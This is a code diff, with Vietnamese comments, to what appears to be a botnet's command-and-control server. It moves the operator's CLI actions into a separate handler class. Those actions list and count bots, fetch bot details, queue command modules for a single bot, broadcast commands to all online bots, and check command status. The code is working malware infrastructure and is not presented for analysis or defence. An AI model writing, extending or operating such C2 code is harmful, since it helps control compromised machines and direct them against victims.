@@ -13,6 +13,7 @@ import sys
 
 import yaml
 
+from server.cli_handler import CLICommandHandler
 from server.commands import CommandQueue
 from server.db import Database
 from server.handler import handle_bot
@@ -134,8 +135,10 @@ class CNCServer:
 
 async def _handle_cli(reader: asyncio.StreamReader, writer: asyncio.StreamWriter,
                       cnc: CNCServer):
-    """Xử lý connection từ CLI tool."""
+    """Xử lý connection từ CLI tool qua TCP."""
     import json
+
+    handler = CLICommandHandler(cnc._db, cnc._cmd_queue)
 
     async def send(obj):
         writer.write((json.dumps(obj) + "\n").encode())
@@ -155,58 +158,8 @@ async def _handle_cli(reader: asyncio.StreamReader, writer: asyncio.StreamWriter
         if req is None:
             break
 
-        action = req.get("action", "")
-
-        if action == "bots_list":
-            bots = await cnc._db.list_bots()
-            await send({"ok": True, "data": bots})
-
-        elif action == "bots_count":
-            counts = await cnc._db.count_bots()
-            await send({"ok": True, "data": counts})
-
-        elif action == "bot_info":
-            bot_id = req.get("bot_id", "")
-            bot = await cnc._db.get_bot(bot_id)
-            if not bot:
-                # try by db id
-                try:
-                    bot = await cnc._db.get_bot_by_db_id(int(bot_id))
-                except ValueError:
-                    pass
-            if bot:
-                await send({"ok": True, "data": bot})
-            else:
-                await send({"ok": False, "error": "Bot not found"})
-
-        elif action == "cmd_send":
-            bot_id = req.get("bot_id", "")
-            module = req.get("module", "")
-            params = req.get("params", {})
-            cmd_id = cnc._cmd_queue.enqueue(bot_id, module, params)
-            await send({"ok": True, "cmd_id": cmd_id})
-
-        elif action == "cmd_broadcast":
-            module = req.get("module", "")
-            params = req.get("params", {})
-            bots = await cnc._db.list_bots()
-            online_bot_ids = [b["bot_id"] for b in bots if b["status"] == "online"]
-            results = cnc._cmd_queue.enqueue_all(online_bot_ids, module, params)
-            await send({"ok": True, "sent_to": len(results), "bot_ids": [bid for bid, _ in results]})
-
-        elif action == "cmd_status":
-            cmd_id = req.get("cmd_id", "")
-            cmd = await cnc._db.get_command(cmd_id)
-            if cmd:
-                await send({"ok": True, "data": cmd})
-            else:
-                await send({"ok": False, "error": "Command not found"})
-
-        elif action == "ping":
-            await send({"ok": True})
-
-        else:
-            await send({"ok": False, "error": f"Unknown action: {action}"})
+        resp = await handler.handle_action(req.get("action", ""), req)
+        await send(resp)
 
     writer.close()
     await writer.wait_closed()
